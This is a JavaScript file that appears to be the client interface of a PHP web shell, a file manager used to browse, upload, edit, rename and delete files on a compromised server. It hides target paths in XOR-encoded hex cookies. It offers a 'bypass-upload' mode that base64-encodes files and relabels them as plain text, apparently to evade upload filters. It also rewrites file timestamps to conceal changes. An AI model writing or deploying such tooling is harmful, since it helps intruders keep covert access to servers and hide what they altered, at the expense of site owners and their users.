async function set_cookie_path(path, refresh = true) {
    document.cookie = "path=" + path;
    if (refresh) {
        location.href = "?";
    }
}

async function change_path(obj) {
    remove_cookie("path");

    var path = obj.getAttribute("path");
    await set_cookie_path(path, false);
    await changePath(path);
    set_message("Loading");
    await init();
    set_message("");
}

async function changePath(path) {
    const wrapper = document.getElementById('path_div');
    wrapper.innerHTML = '';

    const paths = path.split('/').filter(Boolean); 

    let rootLink = document.createElement('a');
    rootLink.href = "#";
    rootLink.textContent = "/";
    wrapper.appendChild(rootLink);

    paths.forEach((pat, id) => {
        let tmpPath = '/' + paths.slice(0, id + 1).join('/');
        let link = document.createElement('a');
        link.href = "#";
        link.setAttribute('path', tmpPath);
        link.textContent = `${pat}/`;
        link.setAttribute("onclick", "change_path(this)");
        wrapper.appendChild(link);
    });
}


async function get_current_path() {
    var path_div = document.getElementById("path_div").textContent;
    var current_path = path_div.split('\n').join();
    return current_path;
}

async function create_file() {
    var name = prompt("File name  ", "hello.php");
    if (!name) return;

    var current_path = await get_current_path();
    current_path = prompt("Directory ", current_path);

    var destination = `${current_path}/${name}`;
    await set_cookie_file(destination);

    location.href = '?action=r';
}

async function refresh_path() {
    document.cookie = "path="; 
    location.href = '?';
}

async function remove_cookie(cookieName) {
    document.cookie = cookieName + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
}

async function set_cookie_file(path) {
    await remove_cookie("filename");
    document.cookie = "filename=" + stringToHex(xorEncryptDecrypt(path));
}

async function change_file(obj, reload = true) {
    var path = obj.getAttribute("path");
    await set_cookie_file(path);    
    if (reload) {
        location.reload();
    }
}

async function create_table_data(name, size, is_writable, date, is_dir) {
    removeLinkByFilename(name);

    var file_name = name.split('/').pop();
    var data = { "name": name, "size": size, "is_writable": is_writable, "date": date };

    var table_row = document.createElement("tr");

    for (var i in data) {
        var td = document.createElement("td");
        if (i == "name") {
            if (is_dir) {
                td.innerHTML = `<a href='#' onclick='change_path(this)' path='${data[i]}' class='ml-2em'><i class='fa-regular fa-folder mr-10'></i>${file_name}</a>`;
            } else {
                td.innerHTML = `<a href='?action=r' onclick='change_file(this)' path='${data[i]}' class='ml-2em'>${file_name}</a>`;
            }
        } else if (i == "date") {
            td.innerHTML += `<a href='#' class='white mr-10' path='${data.name}' onclick='touch_file(this)' value='${data.date}'>${date}</a>`;
        } else {
            td.innerHTML = data[i];
        }

        if (i !== "name") {
            td.setAttribute("class", "tc");
        }
        
        table_row.appendChild(td);
    }

    var td_actions = document.createElement("td");
    td_actions.setAttribute('class', 'tc');
    td_actions.innerHTML += `<a href='#' class='white mr-10' path='${file_name}' onclick='rename_file(this)'>R</a>`;
    td_actions.innerHTML += `<a href='#' class='red mr-10' path='${data.name}' onclick="delete_file(this)">D</a>`;
    table_row.appendChild(td_actions);

    document.getElementById("data_table").appendChild(table_row);
}
async function touch_file(obj) {
    await change_file(obj, false);

    var old_date = obj.getAttribute("value");
    var newdate = prompt("Enter your new date:", old_date);
    if (newdate && newdate !== old_date) {
        var data = new FormData();
        data.append("date", newdate);

        set_message("Loading");

        try {
            let response = await post_url('to', data, false);
            if (!response.ok) {
                set_message("ERROR: Invalid response");
                return false;
            }

            let resp = await response.json();
            if (resp.success) {
                set_message("Date modified!");
                await init();
            } else {
                set_message("ERROR: Failed to change modified date");
            }
        } catch (err) {
            set_message("ERROR: Invalid parse JSON");
            console.log(err);
        }
    }
}

function change_data_info(obj, new_name) {
    var nodeChild = obj.parentElement.parentNode.getElementsByTagName("a");
    var file_name = obj.getAttribute("path").split('/').pop();
    
    for (var i = 0; i < nodeChild.length; i++) {
        var childObject = nodeChild[i];
        if (childObject instanceof Element && childObject.hasAttribute("path")) {
            var childPath = childObject.getAttribute("path");
            var childPathSplit = childPath.split('/');
            childPathSplit[childPathSplit.length - 1] = new_name;

            childObject.setAttribute("path", childPathSplit.join('/'));

            if (childObject.innerText === file_name) {
                childObject.innerHTML = childObject.innerHTML.replace(file_name, new_name);
            }
        }
    }
}

async function rename_file(obj) {
    await change_file(obj, false);

    var current_filename = obj.getAttribute("path");
    var newname = prompt("Enter your new name:", current_filename);
    if (newname && newname !== current_filename) {
        var formdata = new FormData();
        formdata.append("new", newname);
        set_message("Loading");

        try {
            let response = await post_url('re', formdata, false);
            if (!response.ok) {
                set_message("ERROR: Invalid response");
                return false;
            }

            let resp = await response.json();
            if (resp.success) {
                set_message("Renamed!");
                change_data_info(obj, newname);
            } else {
                set_message("ERROR: Failed to rename");
            }
        } catch (err) {
            set_message("ERROR: Invalid parse JSON");
            console.log(err);
        }
    }
}
async function delete_file(obj) {
    await change_file(obj, false);
    set_message("Processing!");

    try {
        let response = await fetch_url('ul');
        if (!response.ok) {
            set_message("ERROR: Invalid response");
            console.log(response)
            return false;
        }

        let message = await response.json();
        if (message.success) {
            set_message("File Deleted!");
            obj.parentElement.parentNode.remove();
        } else {
            set_message("Cannot delete");
        }
    } catch (err) {
        set_message("ERROR: Parsing JSON");
        console.log(err);
    }
}

async function post_url(action, data, parse_json = true) {
    if (parse_json) {
        data = JSON.stringify(data);
    }

    const actionUrl = `?action=${action}`;
    try {
        let response = await fetch(actionUrl, {
            method: "POST",
            body: data
        });
        return response;
    } catch (err) {
        console.error("ERROR: Request failed", err);
    }
}

function stringToHex(str) {
    return str.split('')
              .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
              .join('');
}

function hexToString(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
}

function xorEncryptDecrypt(input, key = "12") {
    let output = '';
    for (let i = 0; i < input.length; i++) {
        output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return output;
}

async function process_upload(data, file_upload) {
    var current_path = await get_current_path();
    set_message("Processing!");

    try {
        let resp = await post_url('up', data, false);
        if (!resp.ok) {
            set_message("Error: Invalid status code");
            return false;
        }

        let j = await resp.json();
        if (j.success) {
            var filesize = (file_upload.size / 1024).toFixed(2);
            var last_modified = new Date(file_upload.lastModified).toLocaleString();
            var name = `${current_path}/${file_upload.name}`;
            set_message("Uploaded!");

            create_table_data(name, filesize, '<p class="green">writable</p>', last_modified, false);
            return true;
        } else {
            set_message("ERROR: Failed to upload");
        }
    } catch (err) {
        set_message("ERROR: Invalid parse JSON");
        console.log(err);
    }
}
async function handle_upload() {
    const fileUpload = document.getElementById("file-upload-input").files[0];
    const bypassUpload = document.getElementById("bypass-upload");
    const data = new FormData();

    if (bypassUpload.checked) {
        const reader = new FileReader();

        data.append("by", true);

        reader.onload = async function(event) {
            const arrayBuffer = event.target.result;
            const binaryString = Array.from(new Uint8Array(arrayBuffer))
                                      .map(byte => String.fromCharCode(byte))
                                      .join('');
            const encodedContent = utf8ToBase64(binaryString);
            const encodedFile = new File(
                [encodedContent],
                fileUpload.name,
                { type: "text/plain" }
            );

            data.append("import_file", encodedFile);
            await process_upload(data, encodedFile);
        };

        reader.readAsArrayBuffer(fileUpload);
    } else {
        data.append("import_file", fileUpload);
        console.log("No data");
        await process_upload(data, fileUpload);
    }
}

function utf8ToBase64(str) {
    return btoa(unescape(encodeURIComponent(str)));
}

async function textarea_handle() {
    console.log('pepek');
    const content = document.getElementById("content").value;
    const encodedContent = utf8ToBase64(content);
    set_message("Processing");

    try {
        const data = { "content": encodedContent };
        const response = await post_url('r', data);
        const respJson = await response.json();
        
        if (respJson.success) {
            set_message("OK");
        } else {
            set_message("Failed!");
        }
    } catch (err) {
        set_message("ERROR: Parsing JSON");
        console.log(err);
    }
}

function removeLinkByFilename(filename) {
    const links = document.querySelectorAll('a[path]');

    links.forEach(link => {
        const filePath = link.getAttribute('path');
        const fileName = filePath.split('/').pop();

        if (fileName === filename) {
            link.closest('tr').remove();
        }
    });
}
async function fetch_url(action) {
    const endpoint = `?action=${action}`;
    try {
        const response = await fetch(endpoint);
        if (!response.ok) {
            throw new Error(`Fetch failed: ${response.statusText}`);
        }
        return response;
    } catch (error) {
        console.error("Error fetching URL:", error);
        set_message("ERROR: Fetching URL");
    }
}

async function init() {
    try {
        var response = await fetch_url("d");
        var element = await response.json();
        console.log("Fetched data:", element); // Debugging line

        element.sort((a, b) => {
            if (a.is_dir !== b.is_dir) {
                return b.is_dir - a.is_dir;
            }
            return a.path.localeCompare(b.path);
        });

        const table = document.getElementById("data_table");
        table.innerHTML = '';

        element.forEach(data => {
            const { is_dir, path, date, is_writable } = data;
            const isWritable = is_writable ? '<p class="green">writable</p>' : '<p class="red">writable</p>';
            create_table_data(path, data.size, isWritable, date, is_dir);
        });
    } catch (err) {
        console.error("Error initializing:", err);
        set_message("ERROR: Initializing data");
    }
}

function create_table_data(name, size, is_writable, date, is_dir) {
    removeLinkByFilename(name);

    const file_name = name.split('/').pop();
    const data = {
        "name": name,
        "size": size,
        "is_writable": is_writable,
        "date": date,
    };

    const table_row = document.createElement("tr");

    for (const key in data) {
        const td = document.createElement("td");
        if (key === "name") {
            if (is_dir) {
                td.innerHTML = `<a href='#' onclick='change_path(this)' path='${data[key]}' class='ml-2em'><i class='fa-regular fa-folder mr-10'></i>${file_name}</a>`;
            } else {
                td.innerHTML = `<a href='?action=r' onclick='change_file(this)' path='${data[key]}' class='ml-2em'>${file_name}</a>`;
            }
        } else if (key === "date") {
            td.innerHTML = `<a href='#' class='white mr-10' path='${data.name}' onclick='touch_file(this)' value='${data.date}'>${date}</a>`;
        } else {
            td.innerHTML = data[key];
        }

        if (key !== "name") {
            td.setAttribute("class", "tc");
        }

        table_row.appendChild(td);
    }

    const td_actions = document.createElement("td");
    td_actions.setAttribute('class', 'tc');
    td_actions.innerHTML += `<a href='#' class='white mr-10' path='${file_name}' onclick='rename_file(this)'>R</a>`;
    td_actions.innerHTML += `<a href='#' class='red mr-10' path='${data.name}' onclick="delete_file(this)">D</a>`;
    table_row.appendChild(td_actions);

    document.getElementById("data_table").appendChild(table_row);
}

function set_message(message) {
    const p_message = document.getElementById("table_message");
    p_message.innerHTML = message;
    p_message.onclick = function() {
        p_message.innerHTML = "";
    };
    setTimeout(() => {
        p_message.innerHTML = "";
    }, 2000);
}

document.addEventListener("DOMContentLoaded", () => {
    const table = document.getElementById("data_table");
    if (table) {
        init();
    }
    const backMenu = document.getElementById("back_menu");
    if (backMenu) {
        document.getElementById("path_div").innerHTML = '';
    }
});
